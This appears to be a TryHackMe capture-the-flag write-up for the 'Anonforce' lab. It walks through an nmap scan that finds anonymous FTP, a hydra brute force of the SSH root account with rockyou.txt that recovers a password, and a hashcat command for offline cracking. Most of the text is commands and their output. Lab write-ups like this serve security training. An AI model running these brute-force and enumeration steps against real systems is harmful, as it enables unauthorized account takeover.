# THM - Anonforce

## IP Address
10.10.211.151

## Write Up
1. do an Nmap scan.
```bash
#make a directory to store where you are going to store you nmap results
mkdir nmap
#scan for open ports and direct results to nmap/initial
nmap -p- -sV -sC -oN nmap/initial 10.10.211.151
```
2. The name results will result as shown. 2 ports will be open ```21``` and ```22```:
```
root@kali:~# nmap -p- -sV -sC -oN nmap/initial 10.10.211.151
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-23 10:33 UTC
Nmap scan report for ip-10-10-211-151.eu-west-1.compute.internal (10.10.211.151)
Host is up (0.0011s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
| drwxr-xr-x   17 0        0            3700 Apr 23 03:32 dev
| drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
| drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
| drwx------    2 0        0           16384 Aug 11  2019 lost+found
| drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
| drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
| drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread [NSE: writeable]
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
| dr-xr-xr-x  104 0        0               0 Apr 23 03:32 proc
| drwx------    3 0        0            4096 Aug 11  2019 root
| drwxr-xr-x   18 0        0             540 Apr 23 03:32 run
| drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
| dr-xr-xr-x   13 0        0               0 Apr 23 03:32 sys
|_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.56.64
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA)
|   256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA)
|_  256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519)
MAC Address: 02:36:EE:53:40:A6 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.10 seconds

```
3. You will get the first flag in ```/home/melodias/user.txt```

## Brute-forcing
4.  Unzip your rockyou.txt if it is still zipped in kali.
```bash
root@kali:~# cd /usr/share/wordlists/
root@kali:/usr/share/wordlists# ls
dirb       fasttrack.txt  metasploit  rockyou.txt.gz
dirbuster  fern-wifi      nmap.lst    wfuzz
root@kali:/usr/share/wordlists# gunzip rockyou.txt.gz
```

5. Use ```hydra``` to bruteforce the ssh root login.
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.211.151
```
- results should return with root password:
```
root@kali:/usr/share/wordlists# hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.211.151
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-23 11:05:16
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.211.151:22/
[STATUS] 180.00 tries/min, 180 tries in 00:01h, 14344223 to do in 1328:11h, 16 active
[STATUS] 139.33 tries/min, 418 tries in 00:03h, 14343985 to do in 1715:48h, 16 active
[STATUS] 117.14 tries/min, 820 tries in 00:07h, 14343583 to do in 2040:46h, 16 active

[STATUS] 118.67 tries/min, 1780 tries in 00:15h, 14342623 to do in 2014:25h, 16 active

[STATUS] 116.16 tries/min, 3601 tries in 00:31h, 14340802 to do in 2057:36h, 16 active
[STATUS] 114.66 tries/min, 5389 tries in 00:47h, 14339014 to do in 2084:18h, 16 active
[22][ssh] host: 10.10.211.151   login: root   password: hikari
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-23 12:04:12
```

## John and Hashcat Method
refer to this writeup for the full detailed write up.
[Anonforce Writeup](https://www.embeddedhacker.com/2019/09/hacking-walkthrough-boot2root-ctf-anonforce/)

- write hashcat like this instead:
```bash
hashcat -D 1 -m 1800 hash.txt /usr/share/wordlists/rockyou.txt --force
```
